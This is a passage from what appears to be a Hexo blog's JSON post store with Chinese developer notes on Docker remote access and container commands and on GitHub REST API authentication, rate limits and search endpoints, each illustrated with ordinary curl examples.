unix:///var/run/docker.sock&quot;</code>    –label给服务器上标签，通过docker info可看到label值，-H 接受三种形式：tcp://host:port，unix:///path/to/socket（默认），fd://* or fd://socketfd，-H 可指定多个，为了保证本地客户端不被影响应加上unix方式<br><code>sudo service docker restart</code>     重启生效<br><code>curl http://xx.xx.xx.xx:2375/info</code>            检测<br><code>docker -H tcp://xx.xx.xx.xx:2375 info</code>    客户端访问  </p>\n<h3 id=\"客户端-server-2-远程连接\"><a href=\"#客户端-server-2-远程连接\" class=\"headerlink\" title=\"客户端(server_2)远程连接\"></a>客户端(server_2)远程连接</h3><p>另一台服务器<br><code>export DOCKER_HOST=&quot;tcp://xx.xx.xx.xx:2375&quot;</code>       默认连接到远程服务端<br><code>docker info</code>            可以从这里看到这时访问到远程服务端<br><code>export DOCKER_HOST=&quot;&quot;</code>            取消默认远程客户端  </p>\n<h2 id=\"与宿主机进行地址映射与文件拷贝\"><a href=\"#与宿主机进行地址映射与文件拷贝\" class=\"headerlink\" title=\"与宿主机进行地址映射与文件拷贝\"></a>与宿主机进行地址映射与文件拷贝</h2><p><code>docker run -d -v /data/volumes/ubuntu:/data --name ubuntu-nginx ubuntu:16.04 /bin/bash</code>        将宿主机的/data/volumes/ubuntu 目录映射到容器/data目录<br><code>docker cp ubuntu-nginx:/a.txt a.txt</code>             将容器内a.txt文件拷贝到宿主机<br>创建数据卷容器，并将数据卷容器挂载给其他容器<br><code>docker run -it -v /var/lib/mysql --name mysql-data ubuntu:16.04 /bin/bash</code>           创建数据卷容器<br><code>docker run -it --volumes-from mysql-data --name mysql uetty/mysql:5.7.23 /bin/bash</code>        挂载数据卷容器  </p>\n<h2 id=\"其他操作命令一览\"><a href=\"#其他操作命令一览\" class=\"headerlink\" title=\"其他操作命令一览\"></a>其他操作命令一览</h2><p><code>docker ps</code>                        查看各镜像状态（无参数：列出运行的容器，-a：列出所有的容器，-l：列出最后运行的容器）<br><code>docker exec -it 8d43 /bin/bash</code>            容器中启动新进程，异步方式进入docker容器命令行（如果容器构建使用的是/bin/sh，最后一个参数换成/bin/sh）<br><code>docker images</code>            可看到uettydkr/test:1.0已进入现有镜像列表中<br><code>docker attach 8d43</code>           附加到docker容器，同步方式进入容器命令行（如果某个客户端阻塞了，该方式进入也会被阻塞，因此不推荐）<br><code>docker inspect 8d43</code>            列出容器json格式信息<br><code>ctrl+p &amp;&amp; ctrl+q</code>            退出交互式容器，容器不会停止运行（即先后按下<code>ctrl + p</code> <code>ctrl + q</code>两个命令）<br><code>docker logs 8d43</code>            返回日志（默认返回所有日志，-f：持续返回日志，-t：返回的日志增加时间戳，–tail 10 指定显示最新的10条日志）<br><code>docker top 8d43</code>            查看运行中容器的进程情况<br><code>docker info</code>            查看docker信息，包括镜像存储位置<br><code>docker search java</code>        从远程镜像仓库查找镜像  </p>\n"},{"title":"Github Api","date":"2019-06-03T08:48:11.000Z","keywords":"github, api","rId":"MB-19060301","_content":"\n##  认证机制 [链接](<https://developer.github.com/v3/#authentication>)\n\n### 认证方式\n\n1. 基础认证方式 `curl -u \"username\" https://api.github.com`或者`curl -u username:token https://api.github.com/user`\n2. OAuth认证方式`curl -H \"Authorization: token OAUTH-TOKEN\" https://api.github.com`\n3. Client ID 和 Client Secret认证`curl -i 'https://api.github.com/users/whatever?client_id=xxxx&client_secret=yyyy'`\n\n### 认证TOKEN及Client ID\n\nTOKEN：进入github账号`settings` -> `Personal access tokens` -> `Generate new token`生成token，开启repo的权限\n\nClient ID：进入github账号`settings` -> `OAuth Apps` \n\n## 频率限制\n\n1. 对于core、search、graphql、integration_mainfest有自定义的频率限制，其他的是统一的频率限制，可通过`/rate_limit`接口查看频率限制，返回限制数量、剩余数量、刷新时间等数据。[链接](<https://developer.github.com/v3/rate_limit/>)\n2. 每次请求，响应头中都会返回`X-RateLimit`、`X-RateLimit-Remaining`、`X-RateLimit-Reset`参数，更新限制数量、剩余数量、刷新时间的\n3. 在search中，对于basic authentication、OAuth、或者client_id和secret的，每分钟最多可以有30个请求。未经验证的请求，每分钟最多10个请求。[链接](<https://developer.github.com/v3/search/#rate-limit>)\n4. 单个用户的所有令牌，每小时共享5000个请求。[链接](<https://developer.github.com/v3/#rate-limiting>)\n5. 经过认证的请求会增加一定量频率限制\n\n\n\n## 请求头要求\n\n1. 请求头携带属性`User-Agent`[链接](<https://developer.github.com/v3/#user-agent-required>)\n\n\n\n## 响应头\n\n1. `Location` 重定向，根据code判断是永久重定向还是临时重定向：`301` - 永久重定向，`302`/`307` - 临时重定向\n2. `Retry-After` 请求频率超限后会出现\n3. `X-RateLimit`、`X-RateLimit-Remaining`、`X-RateLimit-Reset`请求频率限制描述\n4. code：`400` - JSON错误 Bad Request，`422` - 字段非法\n\n\n\n## API接口 [链接](<https://developer.github.com/v3/search/>)\n\n### 1. 搜索仓库\n\n```\nGET /search/repositories\n```\n\n**参数**\n\n\n|Name|Type|Description|\n| :------: | :------: | :----------------------------------------------------------: |\n|`q`|`string`|**Required**.The query contains one or more search keywords and qualifiers. Qualifiers allow you to limit your search to specific areas of GitHub. The REST API supports the same qualifiers as GitHub.com. To learn more about the format of the query, see [Constructing a search query](https://developer.github.com/v3/search/#constructing-a-search-query). See \"[Searching for repositories](https://help.github.com/articles/searching-for-repositories/)\" for a detailed list of qualifiers.|\n|`sort`|`string`|Sorts the results of your query by number of `stars`, `forks`, or `help-wanted-issues` or how recently the items were `updated`. Default: [best match](https://developer.github.com/v3/search/#ranking-search-results)|\n|`order`|`string`|Determines whether the first search result returned is the highest number of matches (`desc`) or lowest number of matches (`asc`). This parameter is ignored unless you provide `sort`. Default: `desc`|\n|per_page|int|max 100|\n|page|int|1-based|\n\n\n**示例**\n\n通用的搜索\n\n```\ncurl https://api.github.com/search/repositories?q=tetris+language:assembly&sort=stars&order=desc\n```\n\n多主题搜索\n\n```\ncurl -H \"Accept: application/vnd.github.mercy-preview+json\" \\\nhttps://api.github.com/search/repositories?q=topic:ruby+topic:rails\n```\n\n**限定符 **[链接](<https://help.github.com/en/articles/searching-for-repositories>)\n\n`in:name`，例：`jquery in:name` 限定仓库名称包含jquery\n\n`in:description`，例： `jquery in:name,description` 限定仓库名称或描述中包含jquery\n\n`in:readme`，例：`jquery in:readme` 限定readme文件中包含jquery\n\n`user: USERNAME`，例：`user:defunkt forks:>100` 限定用户未defunkt并且有大于100个fork\n\n`org: ORGNAME`，例：`org:github`限定组织为github\n\n`size: n`， 例：`size:1000`、`size:>=30000`、`size:<50`、`size:50..120` 限定仓库大小为1MB、大于30MB、小于50KB、在50KB到120KB之间\n\n`forks: n`，例：`forks:5` 分支数量匹配\n\n`stars: n`，例：`stars:10..20` 星数在10到20之间\n\n`created: YYYY-MM-DD`\n\n`pushed: YYYY-MM-DD`\n\n`language: LANGUAGE`\n\n`topic: TOPIC`，例：`topic:jekyll`主题分类是jekyll的\n\n`topics: n`，例：`topics:5`有5个主题分类的\n\n`license: LICENSE_KEYWORD`，例：`license:apache-2.0`匹配证书是Apache License 2.0的 \n\n`is:public`或`is:private`\n\n`mirror:true`或`mirror:false`\n\n`archived:true`或`archived:false `\n\n`repo:USERNAME/REPONAME`\n\n### 2. 搜索提交记录\n\n```\nGET /search/commits\n```\n\n**参数**\n\n\n|Name|Type|Description|\n| :------: | :------: | :----------------------------------------------------------: |\n|`q`|`string`|**Required**.The query contains one or more search keywords and qualifiers. Qualifiers allow you to limit your search to specific areas of GitHub. The REST API supports the same qualifiers as GitHub.com. To learn more about the format of the query, see [Constructing a search query](https://developer.github.com/v3/search/#constructing-a-search-query). See \"[Searching commits](https://help.github.com/articles/searching-commits/)\" for a detailed list of qualifiers.|\n|`sort`|`string`|Sorts the results of your query by `author-date` or `committer-date`. Default: [best match](https://developer.github.com/v3/search/#ranking-search-results)|\n|`order`|`string`|Determines whether the first search result returned is the highest number of matches (`desc`) or lowest number of matches (`asc`). This parameter is ignored unless you provide `sort`. Default: `desc`|\n|per_page|int|max 100|\n|page|int|1-based|\n\n\n**示例**\n\n在octocat/Spoon-Knife仓库搜索css有关的提交\n\n```\ncurl -H \"Accept: application/vnd.github.cloak-preview\" \\\nhttps://api.github.com/search/commits?q=repo:octocat/Spoon-Knife+css\n```\n\n### 3. 搜索代码\n\n```\nGET /search/code\n```\n\n处于搜索的复杂性，有几个搜索限制：\n\n1. 默认仅搜索默认分支，大部分情况下`master`分支是默认分支\n2. 仅搜索小于384K的文件\n3. 必须包含一个关键词，`language:go`是非法的，而`amazing language:go`是可行的\n\n**参数**\n\n\n|Name|Type|Description|\n| :------: | :------: | :----------------------------------------------------------: |\n|`q`|`string`|**Required**.The query contains one or more search keywords and qualifiers. Qualifiers allow you to limit your search to specific areas of GitHub. The REST API supports the same qualifiers as GitHub.com. To learn more about the format of the query, see [Constructing a search query](https://developer.github.com/v3/search/#constructing-a-search-query). See \"[Searching code](https://help.github.com/articles/searching-code/)\" for a detailed list of qualifiers.|\n|  `sort`  | `string` | Sorts the results of your query. Can only be `indexed`, which indicates how recently a file has been indexed by the GitHub search infrastructure. Default: [best match](https://developer.github.com/v3/search/#ranking-search-results)|\n|`order`|`string`|Determines whether the first search result returned is the highest number of matches (`desc`) or lowest number of matches (`asc`). This parameter is ignored unless you provide `sort`. Default: `desc`|\n|per_page|int|max 100|\n|page|int|1-based|\n\n\n**示例**\n\n在jQuery仓库中查找`addClass` \n\n```\ncurl https://api.github.com/search/code?q=addClass+in:file+language:js+repo:jquery/jquery\n```\n\n**接受匹配偏移**\n\n请求头中增加`Accept: application/vnd.github.v3.text-match+json`参数，将会在响应信息中额外接收到`text-matches`字段信息，text-matches是一组列表，列表内对象包含`object_url`、`object_type`、`property`、`fragment`、`matches`，它们用来表示查询字符串在代码中的匹配位置。[链接](<https://developer.github.com/v3/search/#text-match-metadata>)\n\n**注：在没有Authorization的情况下，存在必须指定[user|repo|org]中的一个参数限制**\n\n### 3. 搜索问题\n\n```\nGET /search/issues\n```\n\n**参数**\n\n\n|Name|Type|Description|\n| :------: | :------: | :----------------------------------------------------------: |\n|`q`|`string`|**Required**.The query contains one or more search keywords and qualifiers. Qualifiers allow you to limit your search to specific areas of GitHub. The REST API supports the same qualifiers as GitHub.com. To learn more about the format of the query, see [Constructing a search query](https://developer.github.com/v3/search/#constructing-a-search-query). See \"[Searching issues and pull requests](https://help.github.com/articles/searching-issues-and-pull-requests/)\" for a detailed list of qualifiers.|\n|`sort`|`string`|Sorts the results of your query by the number of `comments`, `reactions`, `reactions-+1`, `reactions--1`, `reactions-smile`, `reactions-thinking_face`, `reactions-heart`, `reactions-tada`, or `interactions`. You can also sort results by how recently the items were `created` or `updated`, Default: [best match](https://developer.github.com/v3/search/#ranking-search-results)|\n|`order`|`string`|Determines whether the first search result returned is the highest number of matches (`desc`) or lowest number of matches (`asc`). This parameter is ignored unless you provide `sort`. Default: `desc`|\n|per_page|int|max 100|\n|page|int|1-based|\n\n\n**示例**\n\n查找最早的未解决的python问题\n\n```\ncurl https://api.github.com/search/issues?q=windows+label:bug+language:python+state:open&sort=created&order=asc\n```\n\n### 4. 搜索用户\n\n```\nGET /search/users\n```\n\n**参数**\n\n\n|Name|Type|Description|\n| :------: | :------: | :----------------------------------------------------------: |\n|`q`|`string`|**Required**.The query contains one or more search keywords and qualifiers. Qualifiers allow you to limit your search to specific areas of GitHub. The REST API supports the same qualifiers as GitHub.com. To learn more about the format of the query, see [Constructing a search query](https://developer.github.com/v3/search/#constructing-a-search-query). See \"[Searching users](https://help.github.com/articles/searching-users/)\" for a detailed list of qualifiers.|\n|`sort`|`string`|Sorts the results of your query by number of `followers` or `repositories`, or when the person `joined` GitHub. Default: [best match](https://developer.github.com/v3/search/#ranking-search-results)|\n|`order`|`string`|Determines whether the first search result returned is the highest number of matches (`desc`) or lowest number of matches (`asc`). This parameter is ignored unless you provide `sort`. Default: `desc`|\n|per_page|int|max 100|\n|page|int|1-based|\n\n\n**示例**\n\n查询热门用户\n\n```\ncurl https://api.github.com/search/users?q=tom+repos:%3E42+followers:%3E1000\n```\n\n### 5. 搜索主题\n\n```\nGET /search/topics\n```\n\n**参数**\n\n\n|Name|Type|Description|\n| :------: | :------: | :----------------------------------------------------------: |\n|`q`|`string`|**Required**. The query contains one or more search keywords and qualifiers. Qualifiers allow you to limit your search to specific areas of GitHub. The REST API supports the same qualifiers as GitHub.com. To learn more about the format of the query, see [Constructing a search query](https://developer.github.com/v3/search/#constructing-a-search-query).|\n|per_page|int|max 100|\n|page|int|1-based|\n\n\n**示例**\n\n搜索精选的ruby有关的主题\n\n```\ncurl -H 'Accept: application/vnd.github.mercy-preview+json' \\\n'https://api.github.com/search/topics?q=ruby+is:featured'\n```\n\n### 6. 搜索标签\n\n```\nGET /search/labels\n```\n\n**参数**\n\n\n|Name|Type|Description|\n| :-------------: | :-------: | :----------------------------------------------------------: |\n|`repository_id`|`integer`|**Required**.The id of the repository.|\n|`q`|`string`|**Required**.The search keywords. This endpoint does not accept qualifiers in the query. To learn more about the format of the query, see [Constructing a search query](https://developer.github.com/v3/search/#constructing-a-search-query).|\n|`sort`|`string`|Sorts the results of your query by when the label was `created` or `updated`. Default: [best match](https://developer.github.com/v3/search/#ranking-search-results)|\n|`order`|`string`|Determines whether the first search result returned is the highest number of matches (`desc`) or lowest number of matches (`asc`). This parameter is ignored unless you provide `sort`. Default: `desc`|\n|per_page|int|max 100|\n|page|int|1-based|\n\n\n**示例**\n\n在指定仓库查找`bug`、`defect`、`eenhancement`有关的标签\n\n```\ncurl -H 'Accept: application/vnd.github.symmetra-preview+json' \\\n'https://api.github.com/search/labels?repository_id=64778136&q=bug+defect+enhancement'\n```\n\n\n\n","source":"_posts/2019-06-03_github_api.md","raw":"---\ntitle: Github Api\ndate: 2019-06-03 16:48:11\ntags: api\npermalink: github-api\nkeywords: github, api\nrId: MB-19060301\n---\n\n##  认证机制 [链接](<https://developer.github.com/v3/#authentication>)\n\n### 认证方式\n\n1. 基础认证方式 `curl -u \"username\" https://api.github.com`或者`curl -u username:token https://api.github.com/user`\n2. OAuth认证方式`curl -H \"Authorization: token OAUTH-TOKEN\" https://api.github.com`\n3. Client ID 和 Client Secret认证`curl -i 'https://api.github.com/users/whatever?client_id=xxxx&client_secret=yyyy'`\n\n### 认证TOKEN及Client ID\n\nTOKEN：进入github账号`settings` -> `Personal access tokens` -> `Generate new token`生成token，开启repo的权限\n\nClient ID：进入github账号`settings` -> `OAuth Apps` \n\n## 频率限制\n\n1. 对于core、search、graphql、integration_mainfest有自定义的频率限制，其他的是统一的频率限制，可通过`/rate_limit`接口查看频率限制，返回限制数量、剩余数量、刷新时间等数据。[链接](<https://developer.github.com/v3/rate_limit/>)\n2. 每次请求，响应头中都会返回`X-RateLimit`、`X-RateLimit-Remaining`、`X-RateLimit-Reset`参数，更新限制数量、剩余数量、刷新时间的\n3. 在search中，对于basic authentication、OAuth、或者client_id和secret的，每分钟最多可以有30个请求。未经验证的请求，每分钟最多10个请求。[链接](<https://developer.github.com/v3/search/#rate-limit>)\n4. 单个用户的所有令牌，每小时共享5000个请求。[链接](<https://developer.github.com/v3/#rate-limiting>)\n5. 经过认证的请求会增加一定量频率限制\n\n\n\n## 请求头要求\n\n1. 请求头携带属性`User-Agent`[链接](<https://developer.github.com/v3/#user-agent-required>)\n\n\n\n## 响应头\n\n1. `Location` 重定向，根据code判断是永久重定向还是临时重定向：`301` - 永久重定向，`302`/`307` - 临时重定向\n2. `Retry-After` 请求频率超限后会出现\n3. `X-RateLimit`、`X-RateLimit-Remaining`、`X-RateLimit-Reset`请求频率限制描述\n4. code：`400` - JSON错误 Bad Request，`422` - 字段非法\n\n\n\n## API接口 [链接](<https://developer.github.com/v3/search/>)\n\n### 1. 搜索仓库\n\n```\nGET /search/repositories\n```\n\n**参数**\n\n\n|Name|Type|Description|\n| :------: | :------: | :----------------------------------------------------------: |\n|`q`|`string`|**Required**.The query contains one or more search keywords and qualifiers. Qualifiers allow you to limit your search to specific areas of GitHub. The REST API supports the same qualifiers as GitHub.com. To learn more about the format of the query, see [Constructing a search query](https://developer.github.com/v3/search/#constructing-a-search-query). See \"[Searching for repositories](https://help.github.com/articles/searching-for-repositories/)\" for a detailed list of qualifiers.|\n|`sort`|`string`|Sorts the results of your query by number of `stars`, `forks`, or `help-wanted-issues` or how recently the items were `updated`. Default: [best match](https://developer.github.com/v3/search/#ranking-search-results)|\n|`order`|`string`|Determines whether the first search result returned is the highest number of matches (`desc`) or lowest number of matches (`asc`). This parameter is ignored unless you provide `sort`. Default: `desc`|\n|per_page|int|max 100|\n|page|int|1-based|\n\n\n**示例**\n\n通用的搜索\n\n```\ncurl https://api.github.com/search/repositories?q=tetris+language:assembly&sort=stars&order=desc\n```\n\n多主题搜索\n\n```\ncurl -H \"Accept: application/vnd.github.mercy-preview+json\" \\\nhttps://api.github.com/search/repositories?q=topic:ruby+topic:rails\n```\n\n**限定符 **[链接](<https://help.github.com/en/articles/searching-for-repositories>)\n\n`in:name`，例：`jquery in:name` 限定仓库名称包含jquery\n\n`in:description`，例： `jquery in:name,description` 限定仓库名称或描述中包含jquery\n\n`in:readme`，例：`jquery in:readme` 限定readme文件中包含jquery\n\n`user: USERNAME`，例：`user:defunkt forks:>100` 限定用户未defunkt并且有大于100个fork\n\n`org: ORGNAME`，例：`org:github`限定组织为github\n\n`size: n`， 例：`size:1000`、`size:>=30000`、`size:<50`、`size:50..120` 限定仓库大小为1MB、大于30MB、小于50KB、在50KB到120KB之间\n\n`forks: n`，例：`forks:5` 分支数量匹配\n\n`stars: n`，例：`stars:10..20` 星数在10到20之间\n\n`created: YYYY-MM-DD`\n\n`pushed: YYYY-MM-DD`\n\n`language: LANGUAGE`\n\n`topic: TOPIC`，例：`topic:jekyll`主题分类是jekyll的\n\n`topics: n`，例：`topics:5`有5个主题分类的\n\n`license: LICENSE_KEYWORD`，例：`license:apache-2.0`匹配证书是Apache License 2.0的 \n\n`is:public`或`is:private`\n\n`mirror:true`或`mirror:false`\n\n`archived:true`或`archived:false `\n\n`repo:USERNAME/REPONAME`\n\n### 2. 搜索提交记录\n\n```\nGET /search/commits\n```\n\n**参数**\n\n\n|Name|Type|Description|\n| :------: | :------: | :----------------------------------------------------------: |\n|`q`|`string`|**Required**.The query contains one or more search keywords and qualifiers. Qualifiers allow you to limit your search to specific areas of GitHub. The REST API supports the same qualifiers as GitHub.com. To learn more about the format of the query, see [Constructing a search query](https://developer.github.com/v3/search/#constructing-a-search-query). See \"[Searching commits](https://help.github.com/articles/searching-commits/)\" for a detailed list of qualifiers.|\n|`sort`|`string`|Sorts the results of your query by `author-date` or `committer-date`. Default: [best match](https://developer.github.com/v3/search/#ranking-search-results)|\n|`order`|`string`|Determines whether the first search result returned is the highest number of matches (`desc`) or lowest number of matches (`asc`). This parameter is ignored unless you provide `sort`. Default: `desc`|\n|per_page|int|max 100|\n|page|int|1-based|\n\n\n**示例**\n\n在octocat/Spoon-Knife仓库搜索css有关的提交\n\n```\ncurl -H \"Accept: application/vnd.github.cloak-preview\" \\\nhttps://api.github.com/search/commits?q=repo:octocat/Spoon-Knife+css\n```\n\n### 3. 搜索代码\n\n```\nGET /search/code\n```\n\n处于搜索的复杂性，有几个搜索限制：\n\n1. 默认仅搜索默认分支，大部分情况下`master`分支是默认分支\n2. 仅搜索小于384K的文件\n3. 必须包含一个关键词，`language:go`是非法的，而`amazing language:go`是可行的\n\n**参数**\n\n\n|Name|Type|Description|\n| :------: | :------: | :----------------------------------------------------------: |\n|`q`|`string`|**Required**.The query contains one or more search keywords and qualifiers. Qualifiers allow you to limit your search to specific areas of GitHub. The REST API supports the same qualifiers as GitHub.com. To learn more about the format of the query, see [Constructing a search query](https://developer.github.com/v3/search/#constructing-a-search-query). See \"[Searching code](https://help.github.com/articles/searching-code/)\" for a detailed list of qualifiers.|\n|  `sort`  | `string` | Sorts the results of your query. Can only be `indexed`, which indicates how recently a file has been indexed by the GitHub search infrastructure. Default: [best match](https://developer.github.com/v3/search/#ranking-search-results)|\n|`order`|`string`|Determines whether the first search result returned is the highest number of matches (`desc`) or lowest number of matches (`asc`). This parameter is ignored unless you provide `sort`. Default: `desc`|\n|per_page|int|max 100|\n|page|int|1-based|\n\n\n**示例**\n\n在jQuery仓库中查找`addClass` \n\n```\ncurl https://api.github.com/search/code?q=addClass+in:file+language:js+repo:jquery/jquery\n```\n\n**接受匹配偏移**\n\n请求头中增加`Accept: application/vnd.github.v3.text-match+json`参数，将会在响应信息中额外接收到`text-matches`字段信息，text-matches是一组列表，列表内对象包含`object_url`、`object_type`、`property`、`fragment`、`matches`，它们用来表示查询字符串在代码中的匹配位置。[链接](<https://developer.github.com/v3/search/#text-match-metadata>)\n\n**注：在没有Authorization的情况下，存在必须指定[user|repo|org]中的一个参数限制**\n\n### 3. 搜索问题\n\n```\nGET /search/issues\n```\n\n**参数**\n\n\n|Name|Type|Description|\n| :------: | :------: | :----------------------------------------------------------: |\n|`q`|`string`|**Required**.The query contains one or more search keywords and qualifiers. Qualifiers allow you to limit your search to specific areas of GitHub. The REST API supports the same qualifiers as GitHub.com. To learn more about the format of the query, see [Constructing a search query](https://developer.github.com/v3/search/#constructing-a-search-query). See \"[Searching issues and pull requests](https://help.github.com/articles/searching-issues-and-pull-requests/)\" for a detailed list of qualifiers.|\n|`sort`|`string`|Sorts the results of your query by the number of `comments`, `reactions`, `reactions-+1`, `reactions--1`, `reactions-smile`, `reactions-thinking_face`, `reactions-heart`, `reactions-tada`, or `interactions`. You can also sort results by how recently the items were `created` or `updated`, Default: [best match](https://developer.github.com/v3/search/#ranking-search-results)|\n|`order`|`string`|Determines whether the first search result returned is the highest number of matches (`desc`) or lowest number of matches (`asc`). This parameter is ignored unless you provide `sort`. Default: `desc`|\n|per_page|int|max 100|\n|page|int|1-based|\n\n\n**示例**\n\n查找最早的未解决的python问题\n\n```\ncurl https://api.github.com/search/issues?q=windows+label:bug+language:python+state:open&sort=created&order=asc\n```\n\n### 4. 搜索用户\n\n```\nGET /search/users\n```\n\n**参数**\n\n\n|Name|Type|Description|\n| :------: | :------: | :----------------------------------------------------------: |\n|`q`|`string`|**Required**.The query contains one or more search keywords and qualifiers. Qualifiers allow you to limit your search to specific areas of GitHub. The REST API supports the same qualifiers as GitHub.com. To learn more about the format of the query, see [Constructing a search query](https://developer.github.com/v3/search/#constructing-a-search-query). See \"[Searching users](https://help.github.com/articles/searching-users/)\" for a detailed list of qualifiers.|\n|`sort`|`string`|Sorts the results of your query by number of `followers` or `repositories`, or when the person `joined` GitHub. Default: [best match](https://developer.github.com/v3/search/#ranking-search-results)|\n|`order`|`string`|Determines whether the first search result returned is the highest number of matches (`desc`) or lowest number of matches (`asc`). This parameter is ignored unless you provide `sort`. Default: `desc`|\n|per_page|int|max 100|\n|page|int|1-based|\n\n\n**示例**\n\n查询热门用户\n\n```\ncurl https://api.github.com/search/users?q=tom+repos:%3E42+followers:%3E1000\n```\n\n### 5. 搜索主题\n\n```\nGET /search/topics\n```\n\n**参数**\n\n\n|Name|Type|Description|\n| :------: | :------: | :----------------------------------------------------------: |\n|`q`|`string`|**Required**. The query contains one or more search keywords and qualifiers. Qualifiers allow you to limit your search to specific areas of GitHub. The REST API supports the same qualifiers as GitHub.com. To learn more about the format of the query, see [Constructing a search query](https://developer.github.com/v3/search/#constructing-a-search-query).|\n|per_page|int|max 100|\n|page|int|1-based|\n\n\n**示例**\n\n搜索精选的ruby有关的主题\n\n```\ncurl -H 'Accept: application/vnd.github.mercy-preview+json' \\\n'https://api.github.com/search/topics?q=ruby+is:featured'\n```\n\n### 6. 搜索标签\n\n```\nGET /search/labels\n```\n\n**参数**\n\n\n|Name|Type|Description|\n| :-------------: | :-------: | :----------------------------------------------------------: |\n|`repository_id`|`integer`|**Required**.The id of the repository.|\n|`q`|`string`|**Required**.The search keywords. This endpoint does not accept qualifiers in the query. To learn more about the format of the query, see [Constructing a search query](https://developer.github.com/v3/search/#constructing-a-search-query).|\n|`sort`|`string`|Sorts the results of your query by when the label was `created` or `updated`. Default: [best match](https://developer.github.com/v3/search/#ranking-search-results)|\n|`order`|`string`|Determines whether the first search result returned is the highest number of matches (`desc`) or lowest number of matches (`asc`). This parameter is ignored unless you provide `sort`. Default: `desc`|\n|per_page|int|max 100|\n|page|int|1-based|\n\n\n**示例**\n\n在指定仓库查找`bug`、`defect`、`eenhancement`有关的标签\n\n```\ncurl -H 'Accept: application/vnd.github.symmetra-preview+json' \\\n'https://api.github.com/search/labels?repository_id=64778136&q=bug+defect+enhancement'\n```\n\n\n\n","slug":"github-api","published":1,"updated":"2020-02-14T14:16:17.976Z","_id":"ck5qhi071002kg0ukj843fgy6","comments":1,"layout":"post","photos":[],"link":"","content":"<h2 id=\"认证机制-链接\"><a href=\"#认证机制-链接\" class=\"headerlink\" title=\"认证机制 链接\"></a>认证机制 <a href=\"https://developer.github.com/v3/#authentication\" target=\"_blank\" rel=\"noopener\">链接</a></h2><h3 id=\"认证方式\"><a href=\"#认证方式\" class=\"headerlink\" title=\"认证方式\"></a>认证方式</h3><ol>\n<li>基础认证方式 <code>curl -u &quot;username&quot; https://api.github.com</code>或者<code>curl -u username:token https://api.github.com/user</code></li>\n<li>OAuth认证方式<code>curl -H &quot;Authorization: token OAUTH-TOKEN&quot; https://api.github.com</code></li>\n<li>Client ID 和 Client Secret认证<code>curl -i &#39;https://api.github.com/users/whatever?client_id=xxxx&amp;client_secret=yyyy&#39;</code></li>\n</ol>\n<h3 id=\"认证TOKEN及Client-ID\"><a href=\"#认证TOKEN及Client-ID\" class=\"headerlink\" title=\"认证TOKEN及Client ID\"></a>认证TOKEN及Client ID</h3><p>TOKEN：进入github账号<code>settings</code> -&gt; <code>Personal access tokens</code> -&gt; <code>Generate new token</code>生成token，开启repo的权限</p>\n<p>Client ID：进入github账号<code>settings</code> -&gt; <code>OAuth Apps</code> </p>\n<h2 id=\"频率限制\"><a href=\"#频率限制\" class=\"headerlink\" title=\"频率限制\"></a>频率限制</h2><ol>\n<li>对于core、search、graphql、integration_mainfest有自定义的频率限制，其他的是统一的频率限制，可通过<code>/rate_limit</code>接口查看频率限制，返回限制数量、剩余数量、刷新时间等数据。<a href=\"https://developer.github.com/v3/rate_limit/\" target=\"_blank\" rel=\"noopener\">链接</a></li>\n<li>每次请求，响应头中都会返回<code>X-RateLimit</code>、<code>X-RateLimit-Remaining</code>、<code>X-RateLimit-Reset</code>参数，更新限制数量、剩余数量、刷新时间的</li>\n<li>在search中，对于basic authentication、OAuth、或者client_id和secret的，每分钟最多可以有30个请求。未经验证的请求，每分钟最多10个请求。<a href=\"https://developer.github.com/v3/search/#rate-limit\" target=\"_blank\" rel=\"noopener\">链接</a></li>\n<li>单个用户的所有令牌，每小时共享5000个请求。<a href=\"https://developer.github.com/v3/#rate-limiting\" target=\"_blank\" rel=\"noopener\">链接</a></li>\n<li>经过认证的请求会增加一定量频率限制</li>\n</ol>\n<h2 id=\"请求头要求\"><a href=\"#请求头要求\" class=\"headerlink\" title=\"请求头要求\"></a>请求头要求</h2><ol>\n<li>请求头携带属性<code>User-Agent</code><a href=\"https://developer.github.com/v3/#user-agent-required\" target=\"_blank\" rel=\"noopener\">链接</a></li>\n</ol>\n<h2 id=\"响应头\"><a href=\"#响应头\" class=\"headerlink\" title=\"响应头\"></a>响应头</h2><ol>\n<li><code>Location</code> 重定向，根据code判断是永久重定向还是临时重定向：<code>301</code> - 永久重定向，<code>302</code>/<code>307</code> - 临时重定向</li>\n<li><code>Retry-After</code> 请求频率超限后会出现</li>\n<li><code>X-RateLimit</code>、<code>X-RateLimit-Remaining</code>、<code>X-RateLimit-Reset</code>请求频率限制描述</li>\n<li>code：<code>400</code> - JSON错误 Bad Request，<code>422</code> - 字段非法</li>\n</ol>\n<h2 id=\"API接口-链接\"><a href=\"#API接口-链接\" class=\"headerlink\" title=\"API接口 链接\"></a>API接口 <a href=\"https://developer.github.com/v3/search/\" target=\"_blank\" rel=\"noopener\">链接</a></h2><h3 id=\"1-搜索仓库\"><a href=\"#1-搜索仓库\" class=\"headerlink\" title=\"1. 搜索仓库\"></a>1. 搜索仓库</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">GET /search/repositories</span><br></pre></td></tr></table></figure>\n\n<p><strong>参数</strong></p>\n<table>\n<thead>\n<tr>\n<th align=\"center\">Name</th>\n<th align=\"center\">Type</th>\n<th align=\"center\">Description</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"center\"><code>q</code></td>\n<td align=\"center\"><code>string</code></td>\n<td align=\"center\"><strong>Required</strong>.The query contains one or more search keywords and qualifiers. Qualifiers allow you to limit your search to specific areas of GitHub. The REST API supports the same qualifiers as GitHub.com. To learn more about the format of the query, see <a href=\"https://developer.github.com/v3/search/#constructing-a-search-query\" target=\"_blank\" rel=\"noopener\">Constructing a search query</a>. See “<a href=\"https://help.github.com/articles/searching-for-repositories/\" target=\"_blank\" rel=\"noopener\">Searching for repositories</a>“ for a detailed list of qualifiers.</td>\n</tr>\n<tr>\n<td align=\"center\"><code>sort</code></td>\n<td align=\"center\"><code>string</code></td>\n<td align=\"center\">Sorts the results of your query by number of <code>stars</code>, <code>forks</code>, or <code>help-wanted-issues</code> or how recently the items were <code>updated</code>. Default: <a href=\"https://developer.github.com/v3/search/#ranking-search-results\" target=\"_blank\" rel=\"noopener\">best match</a></td>\n</tr>\n<tr>\n<td align=\"center\"><code>order</code></td>\n<td align=\"center\"><code>string</code></td>\n<td align=\"center\">Determines whether the first search result returned is the highest number of matches (<code>desc</code>) or lowest number of matches (<code>asc</code>). This parameter is ignored unless you provide <code>sort</code>. Default: 